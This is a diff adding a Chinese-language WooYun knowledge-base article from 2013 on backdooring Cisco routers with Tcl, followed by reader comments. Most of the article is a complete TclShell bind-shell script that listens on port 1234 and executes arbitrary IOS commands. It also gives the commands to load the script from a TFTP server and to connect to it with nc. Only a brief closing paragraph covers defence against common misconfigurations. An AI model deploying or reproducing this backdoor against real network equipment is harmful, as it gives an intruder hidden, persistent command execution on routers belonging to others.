@@ -1,0 +1,40 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">给CISCO设备中后门的方法--TCL 以及路由安全</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">lion(lp)</a> <span class="bull">·</span> <time title="2013/01/29 15:50" ui-time="" datetime="2013/01/29 15:50" class="published ng-binding ng-isolate-scope">2013/01/29 15:50</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p>之前在 zone 里边有人讨论过CISCO 的后门问题我就说了个利用TCL cisco 的一个脚本处理技术详见<a href="http://www.cisco.com/en/US/docs/ios/12_3t/12_3t2/feature/guide/gt_tcl.html">http://www.cisco.com/en/US/docs/ios/12&#95;3t/12&#95;3t2/feature/guide/gt_tcl.html</a>现在给整理出来。郑重声明本人仅讨论方法与该技术如利用此技术给他人造成的经济损失与本人无关。 首先给出脚本此脚本非本人所写国外已经有大牛写出来了<pre><code># TclShell.tcl v0.1 by Andy Davis, IRM 2007
+
+#
+
+# IRM accepts no responsibility for the misuse of this code
+
+# It is provided for demonstration purposes only
+
+proc callback {sock addr port} {  
+fconfigure $sock -translation lf -buffering line  
+puts $sock " "  
+puts $sock "---|---|---|---|---|---|---|---|---|---|---|---|-"  
+puts $sock "TclShell v0.1 by Andy Davis, IRM 2007"  
+puts $sock "---|---|---|---|---|---|---|---|---|---|---|---|-"  
+puts $sock " "  
+set response [exec "sh ver | inc IOS"]  
+puts $sock $response  
+set response [exec "sh priv"]  
+puts $sock $response  
+puts $sock " "  
+puts $sock "Enter IOS command:"  
+fileevent $sock readable [list echo $sock]  
+}  
+proc echo {sock} {  
+global var  
+if {[eof $sock] || [catch {gets $sock line}]} {  
+} else {  
+set response [exec "$line"]  
+puts $sock $response  
+}  
+}  
+set port 1234  
+set sh [socket -server callback $port]  
+vwait var  
+close $sh
+</code></pre>在CISCO设备上运行如下命令需要有tftp<pre><code>Router#tclsh
+
+Router(tcl)#source tftp://1.1.1.2/backdoor.tcl
+</code></pre>设备会变成假死状态因此不建议在console下运行基本上也不可能，在其他机器上<pre><code>nc 路由器IP 1234
+</code></pre>附截图一张 <img alt="20130129153731_80467.jpg" img-src="2013101807230255315.jpg">   防御办法其实这个功能本来是方便给网络攻城狮批量配置和测试使用的。因此需要LV 15的权限因此只要LV15的权限还在就没有太大问题。其实CISCO 设备的菊花还是不太好爆的除了有0day 基本上都是因为人为的配置不当产生的，常见的比如配置了可写的但是很SB的SNMP，开放了一些不怎么使用或者有危险的服务.比如未授权的http 而且不用认证就可以跑配置出来或者使用了enable password 而不是 enable secret 设置密码，要不就是使用了弱密码，如果这些如果杜绝了基本上菊花差不多就可以保住了</p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">乌帽子</span> <span class="reply-time">2013-03-08 10:09:52</span></div><p></p><p>RSS不能用</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Jam</span> <span class="reply-time">2013-03-06 16:07:34</span></div><p></p><p>没有代码语法高亮啊</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">rehd</span> <span class="reply-time">2013-03-05 10:18:54</span></div><p></p><p>赞一个！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">lion(lp)</span> <span class="reply-time">2013-02-07 13:40:52</span></div><p></p><p>@tmp 复杂了，基本上12.4T以上的版本（甚至稍微低一些 版本），就可以支持了。我那个就是用的模拟器做的</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">tmp</span> <span class="reply-time">2013-02-07 11:09:33</span></div><p></p><p>部署tcl后门不像你想的那么难.简单得很.困难的是.cisco到底是否支持tcl. 太久没折腾cisco了.我都忘记支持版本了. 12.5 以上??? 这些东西玩的时候.看资料自然就记得了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">疯狗</span> <span class="reply-time">2013-02-04 15:24:04</span></div><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">hongygxiang</span> <span class="reply-time">2013-01-30 12:07:38</span></div><p></p><p>好淫荡</p><p></p></div></div></div></div></div></main>
